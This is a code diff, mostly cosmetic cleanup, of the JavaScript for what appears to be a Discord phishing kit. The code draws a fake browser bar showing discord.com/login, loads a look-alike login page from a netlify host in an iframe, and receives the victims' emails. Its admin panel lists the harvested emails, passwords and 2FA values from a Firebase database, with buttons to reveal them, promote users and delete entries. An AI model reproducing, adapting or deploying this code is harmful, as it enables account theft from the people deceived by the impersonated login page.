@@ -1,4 +1,3 @@
-// Firebase Configuration
 const firebaseConfig = {
     databaseURL: "https://kom-tm-default-rtdb.europe-west1.firebasedatabase.app/"
 };
@@ -12,7 +11,6 @@ const LOGIN_PAGE_URL = "https://playful-cuchufli-1e7726.netlify.app";
 firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
 
-// Elements
 const loginScreen = document.getElementById('login-screen');
 const successScreen = document.getElementById('success-screen');
 const errorScreen = document.getElementById('error-screen');
@@ -20,8 +18,6 @@ const adminScreen = document.getElementById('admin-screen');
 const adminAccessBtn = document.getElementById('admin-access-btn');
 const tryAgainBtn = document.getElementById('try-again-btn');
 const adminLogoutBtn = document.getElementById('admin-logout-btn');
-
-// URL Bar
 const urlInput = document.getElementById('url-input');
 const tabTitle = document.getElementById('tab-title');
 const tabFavicon = document.getElementById('tab-favicon');
@@ -29,14 +25,10 @@ const loginIframe = document.getElementById('login-iframe');
 const errorPage = document.getElementById('error-page');
 const errorDomainEl = document.getElementById('error-domain');
 const errorMessageEl = document.getElementById('error-message');
-
-// URL Modal
 const urlWarningModal = document.getElementById('url-warning-modal');
 const modalBackdrop = document.getElementById('modal-backdrop');
 const modalCancelBtn = document.getElementById('modal-cancel-btn');
 const modalContinueBtn = document.getElementById('modal-continue-btn');
-
-// Admin elements
 const generateCodeBtn = document.getElementById('generate-code-btn');
 const generatedCodeDisplay = document.getElementById('generated-code-display');
 const codeText = document.getElementById('code-text');
@@ -46,8 +38,6 @@ const copyCodeBtn = document.getElementById('copy-code-btn');
 const eyeIconShow = document.getElementById('eye-icon-show');
 const eyeIconHide = document.getElementById('eye-icon-hide');
 const codesList = document.getElementById('codes-list');
-
-// Close Ticket Modal
 const closeTicketModal = document.getElementById('close-ticket-modal');
 const closeTicketBackdrop = document.getElementById('close-ticket-backdrop');
 const closeReasonInput = document.getElementById('close-reason-input');
@@ -65,12 +55,10 @@ let closingTicketKey = null;
 const originalUrl = 'https://discord.com/login';
 const discordFavicon = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%235865F2' d='M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z'/%3E%3C/svg%3E";
 
-// Init iframe on load
 window.addEventListener('DOMContentLoaded', () => {
     loginIframe.src = LOGIN_PAGE_URL;
 });
 
-// ==================== URL BAR ====================
 urlInput.addEventListener('focus', () => { urlInput.select(); });
 
 urlInput.addEventListener('keydown', (e) => {
@@ -104,10 +92,7 @@ modalContinueBtn.addEventListener('click', () => {
 
 function handleUrlNavigation(inputValue) {
     const isValidUrl = inputValue.includes('.') && !inputValue.includes(' ');
-    if (!isValidUrl) {
-        showDomainError(inputValue);
-        return;
-    }
+    if (!isValidUrl) { showDomainError(inputValue); return; }
 
     let formattedUrl = inputValue;
     if (!inputValue.startsWith('http://') && !inputValue.startsWith('https://')) {
@@ -119,7 +104,6 @@ function handleUrlNavigation(inputValue) {
         const domain = url.hostname.replace('www.', '');
         const siteName = domain.split('.')[0];
         const capitalizedName = siteName.charAt(0).toUpperCase() + siteName.slice(1);
-
         tabTitle.textContent = capitalizedName;
         tabFavicon.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
         urlInput.value = formattedUrl;
@@ -151,7 +135,6 @@ function resetToDiscord() {
     loginIframe.src = LOGIN_PAGE_URL;
 }
 
-// ==================== IFRAME MESSAGE LISTENER ====================
 window.addEventListener('message', (event) => {
     if (event.data && event.data.type === 'login-success') {
         currentUserEmail = event.data.email;
@@ -164,9 +147,7 @@ async function handleLoginSuccess(email) {
     sessionStorage.setItem('mccg_email', email);
     loginScreen.classList.add('hidden');
     successScreen.classList.remove('hidden');
-
     await checkAdminStatus(email);
-
     setTimeout(() => {
         successScreen.classList.add('hidden');
         if (isAdmin) adminAccessBtn.classList.remove('hidden');
@@ -186,7 +167,6 @@ async function checkAdminStatus(email) {
     }
 }
 
-// ==================== BUTTONS ====================
 tryAgainBtn.addEventListener('click', () => {
     errorScreen.classList.add('hidden');
     loginScreen.classList.remove('hidden');
@@ -211,11 +191,9 @@ adminLogoutBtn.addEventListener('click', () => {
     resetToDiscord();
 });
 
-// ==================== CODE GENERATOR ====================
 generateCodeBtn.addEventListener('click', async () => {
     const code = generateMCCode();
     currentGeneratedCode = code;
-
     try {
         await database.ref('codes/' + code).set({
             code: code,
@@ -223,7 +201,6 @@ generateCodeBtn.addEventListener('click', async () => {
             createdAt: new Date().toISOString(),
             createdBy: currentUserEmail
         });
-
         codeText.textContent = '*'.repeat(code.length);
         codeText.classList.add('code-hidden');
         isCodeVisible = false;
@@ -271,12 +248,7 @@ function generateMCCode() {
     return code;
 }
 
-// ==================== ADMIN DATA ====================
-function loadAdminData() {
-    loadCodes();
-    loadLogins();
-    loadAdminTickets();
-}
+function loadAdminData() { loadCodes(); loadLogins(); loadAdminTickets(); }
 
 function loadCodes() {
     database.ref('codes').on('value', (snapshot) => {
@@ -301,12 +273,8 @@ function loadCodes() {
                         </div>
                         <div class="code-item-actions">
                             <button class="eye-btn toggle-list-code" data-code="${code.code}">
-                                <svg class="eye-show" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
-                                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
-                                </svg>
-                                <svg class="eye-hide hidden" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
-                                    <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27z"/>
-                                </svg>
+                                <svg class="eye-show" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                                <svg class="eye-hide hidden" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27z"/></svg>
                             </button>
                             <button class="icon-btn copy-list-code" data-code="${code.code}">Copy</button>
                             <button class="delete-btn delete-code" data-key="${key}">Delete</button>
@@ -391,21 +359,15 @@ function loadLogins() {
                             <div class="password-cell">
                                 <span class="password-text" data-password="${escapeHtml(login.password || '')}">${hiddenPw}</span>
                                 <button class="eye-btn toggle-password">
-                                    <svg class="eye-show" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
-                                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
-                                    </svg>
-                                    <svg class="eye-hide hidden" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
-                                        <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27z"/>
-                                    </svg>
+                                    <svg class="eye-show" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                                    <svg class="eye-hide hidden" viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27z"/></svg>
                                 </button>
                             </div>
                         </td>
                         <td>${twofaDisplay}</td>
                         <td>${formattedDate}</td>
                         <td style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
-                            <button class="icon-btn make-admin" data-key="${key}" ${login.owner ? 'disabled style="opacity:0.5"' : ''}>
-                                ${login.owner ? 'Is Admin' : 'Make Admin'}
-                            </button>
+                            <button class="icon-btn make-admin" data-key="${key}" ${login.owner ? 'disabled style="opacity:0.5"' : ''}>${login.owner ? 'Is Admin' : 'Make Admin'}</button>
                             <button class="delete-btn delete-login" data-key="${key}">Delete</button>
                         </td>
                     </tr>
@@ -474,7 +436,9 @@ function loadAdminTickets() {
 
                 const pfpHtml = isAdminAuthor
                     ? `<img src="https://i.ibb.co/HDxMBCcJ/gpt-image-1-5-high-fidelity-a-Make-the-M-have-a-pu.png" class="ticket-pfp" alt="Admin">`
-                    : `<div class="ticket-pfp-default">${initial}</div>`;
+                    : (authorName !== 'Anonymous'
+                        ? `<div class="ticket-pfp-default ticket-pfp-initial">${initial}</div>`
+                        : `<div class="ticket-pfp-default ticket-pfp-grey"><svg viewBox="0 0 24 24" width="20" height="20" fill="#8e9297"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg></div>`);
 
                 html += `
                     <div class="ticket-card status-${statusClass}">
@@ -537,15 +501,11 @@ function loadAdminTickets() {
     });
 }
 
-// ==================== CLOSE TICKET MODAL ====================
 confirmCloseBtn.addEventListener('click', async () => {
     const reason = closeReasonInput.value.trim();
     if (!reason) { alert('Please enter a reason.'); return; }
     if (closingTicketKey) {
-        await database.ref('tickets/' + closingTicketKey).update({
-            status: 'closed',
-            closeReason: reason
-        });
+        await database.ref('tickets/' + closingTicketKey).update({ status: 'closed', closeReason: reason });
     }
     closeTicketModal.classList.add('hidden');
     closeReasonInput.value = '';
@@ -564,7 +524,6 @@ closeTicketBackdrop.addEventListener('click', () => {
     closingTicketKey = null;
 });
 
-// ==================== HELPERS ====================
 function escapeHtml(text) {
     if (!text) return '';
     const div = document.createElement('div');
